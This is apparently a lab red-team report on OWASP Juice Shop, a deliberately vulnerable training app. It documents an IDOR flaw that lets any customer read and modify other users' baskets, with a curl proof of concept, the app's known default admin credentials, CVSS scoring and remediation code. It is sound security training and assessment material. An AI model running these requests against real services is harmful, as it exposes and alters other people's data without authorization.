# Mission Report — 2026-03-12-003
**Target**: OWASP Juice Shop v19.2.0-SNAPSHOT
**IP**: 10.10.30.130:3000
**Mission ID**: 2026-03-12-003
**Challenge**: IDOR Basket Access
**Date**: 2026-03-12
**Classification**: Lab — Authorized Testing

---

## Executive Summary

A full red team assessment was conducted against OWASP Juice Shop targeting the application's shopping basket API. The assessment confirmed a critical Insecure Direct Object Reference (IDOR) vulnerability on the `/rest/basket/:id` endpoint that allows any authenticated user to read and modify the basket contents of any other user — including administrators.

Three exploits were confirmed across two IDOR attack vectors (read and write), satisfying the mission objective of 3 confirmed exploits. The vulnerability requires only a customer-level account and no privilege escalation. All 22+ registered users are at risk of cart data exposure and unauthorized cart manipulation.

---

## Target Profile

| Field | Value |
|-------|-------|
| Application | OWASP Juice Shop |
| Version | 19.2.0-SNAPSHOT |
| Framework | Express 4.22.1 (Node.js) |
| Port | 3000/tcp (HTTP only) |
| Auth Mechanism | JWT (RS256) |
| Open Ports | 3000 only |

---

## Mission Constraints

| Constraint | Value |
|-----------|-------|
| allowed_attack_types | idor, enumeration |
| out_of_scope | none |
| max_exploits | 3 |
| confirmed_exploit_count | 3 |

No out-of-scope attacks were attempted. All 3 confirmed exploits used IDOR (allowed).

---

## Phase Summary

### Phase 1 — Reconnaissance
- Application fingerprinted as Juice Shop v19.2.0-SNAPSHOT
- Open unauthenticated endpoints: `/ftp/` (directory listing), `/metrics` (Prometheus), `/rest/admin/application-version`
- Admin authentication confirmed using known credentials (admin@juice-sh.op:admin123)
- 22 users enumerated via `/api/Users` with admin JWT
- Basket API structure mapped: `/rest/basket/:id` returns full product list + UserId

### Phase 2 — Scanning
- Single exposed port: 3000/tcp (HTTP)
- CORS wildcard (`Access-Control-Allow-Origin: *`)
- All HTTP methods allowed: GET, HEAD, PUT, PATCH, POST, DELETE
- No CSP, no HSTS, no rate limiting headers observed

### Phase 3 — Enumeration
- Registered test account: idortest@pwn.lab (User ID 24, Basket ID 7)
- Customer JWT tested against baskets 1-7 — all returned HTTP 200 regardless of ownership
- Basket ownership map established (basket ID 1=admin, 2=jim, 3=bender, 4=amy, 5=uvogin)
- `/api/BasketItems` confirmed to return ALL basket items across ALL users with any valid JWT
- Root cause identified: JWT presence validated, basket ownership NOT validated

### Phase 4 — Exploitation

#### Exploit 1 — IDOR Read: Admin Basket
- **Vector**: `GET /rest/basket/1` with User 24 JWT
- **Result**: HTTP 200 — Full admin basket returned (3 items, $21.94 value)
- **OWASP**: A01:2021 — Broken Access Control

#### Exploit 2 — IDOR Write: Modify Another User's Cart
- **Vector**: `PUT /api/BasketItems/4` with User 24 JWT + `{"quantity":5}`
- **Result**: HTTP 200 — Jim's item quantity changed from 2 to 5 (confirmed in basket re-read)
- **OWASP**: A01:2021 — Broken Access Control

#### Exploit 3 — IDOR Read: Peer Customer Basket
- **Vector**: `GET /rest/basket/3` with User 24 JWT
- **Result**: HTTP 200 — Bender's basket exposed (Raspberry Juice x1, $4.99)
- **OWASP**: A01:2021 — Broken Access Control

### Phase 5 — Post-Exploitation
- Full basket dump: 6 baskets, covering users including admin, jim, bender, amy, uvogin
- Financial exposure confirmed: cart totals ranging from $4.99 to $54.93
- Write impact: Jim's basket permanently modified (qty 2 → 5)
- Order tracking endpoint (`/rest/track-order/:id`) also exposed cross-user
- `/api/BasketItems` leaked full cross-user item inventory

---

## Vulnerability Details

### IDOR — Basket Read/Write (Critical)

**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)
**OWASP 2021**: A01 — Broken Access Control
**CVSS v3.1**: 8.1 (High)
- Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

**Description**: The `/rest/basket/:id` endpoint accepts a sequential integer basket ID and returns the full basket contents without verifying that the requesting user's JWT subject matches the basket's `UserId` field. The `/api/BasketItems/:id` PUT endpoint similarly lacks ownership validation, allowing arbitrary quantity modification of basket items belonging to other users.

**Affected Endpoints**:
- `GET /rest/basket/:id` — Read any basket
- `PUT /api/BasketItems/:id` — Modify any basket item
- `GET /api/BasketItems` — List all items from all baskets

**Root Cause**: The Express middleware stack validates the presence and signature of the JWT but performs no authorization check comparing `token.data.id` to `basket.UserId`.

**Proof of Concept**:
```bash
# 1. Register attacker account
curl -X POST http://TARGET:3000/api/Users \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"Pass1234","passwordRepeat":"Pass1234","securityQuestion":{"id":1,"question":"test"},"securityAnswer":"test"}'

# 2. Authenticate
JWT=$(curl -s -X POST http://TARGET:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"Pass1234"}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

# 3. Access any victim basket
curl http://TARGET:3000/rest/basket/1 -H "Authorization: Bearer $JWT"

# 4. Modify any basket item
curl -X PUT http://TARGET:3000/api/BasketItems/4 \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"quantity":5}'
```

---

## Remediation Recommendations

### Priority 1 — Fix basket ownership check (Critical)
In the route handler for `GET /rest/basket/:id`, add an authorization check:
```javascript
// After fetching basket from DB
if (basket.UserId !== req.user.data.id && req.user.data.role !== 'admin') {
  return res.status(403).json({ error: 'Access denied' })
}
```

### Priority 2 — Fix BasketItems authorization (Critical)
For `GET /api/BasketItems`, filter results to only include items in the authenticated user's basket. For `PUT /api/BasketItems/:id`, verify the item's `BasketId` matches the authenticated user's basket before allowing modification.

### Priority 3 — Apply consistent authorization middleware (High)
Implement a centralized ownership-check middleware that validates resource ownership before any operation on user-scoped resources (baskets, orders, addresses, etc.).

### Priority 4 — Add non-sequential IDs (Medium)
Replace sequential integer basket IDs with UUIDs to eliminate the ability to enumerate and predict resource IDs. Note: this is a mitigation, not a fix — proper authorization checks are still required.

### Priority 5 — Audit all other IDOR surfaces (High)
The same pattern likely applies to: `/rest/track-order/:id`, `/api/Addresss`, payment methods, delivery addresses, and order history.

---

## Attack Chain Diagram

```
Attacker (any customer account)
    |
    v
POST /rest/user/login
    |
    v
JWT obtained (customer role)
    |
    +---> GET /rest/basket/1      --> Admin basket exposed (READ)
    |
    +---> GET /api/BasketItems    --> All users' items exposed (READ ALL)
    |
    +---> PUT /api/BasketItems/4  --> Jim's item modified (WRITE)
    |
    +---> GET /rest/basket/3      --> Bender's basket exposed (READ)
```

---

## Lessons Learned

1. **Authentication != Authorization**: The application correctly validates JWT signatures but never checks whether the authenticated user has permission to access the specific resource requested.

2. **Sequential IDs enable enumeration**: Integer basket IDs (1, 2, 3...) allow trivial enumeration. All 6 populated baskets were accessed by incrementing a single integer.

3. **Shared list endpoints leak cross-user data**: The `/api/BasketItems` endpoint returning all users' items represents a completely unfiltered data leak, compounding the IDOR on individual basket endpoints.

4. **Low barrier to exploitation**: Account registration requires no email verification. An attacker needs only one HTTP request to register and another to authenticate before having full access to all other users' basket data.

---

## Files
- `recon/recon_findings.md` — Full recon findings
- `scan/scan_results.md` — Port/service scan results
- `enum/enum_findings.md` — IDOR enumeration and basket mapping
- `exploit/exploit_log.md` — Detailed exploit records with request/response
- `postex/postex_assessment.md` — Impact assessment and additional surface analysis
- `loot/basket_dump.json` — Collected basket data from 6 users
- `report/walkthrough.md` — Reproducible step-by-step attack walkthrough
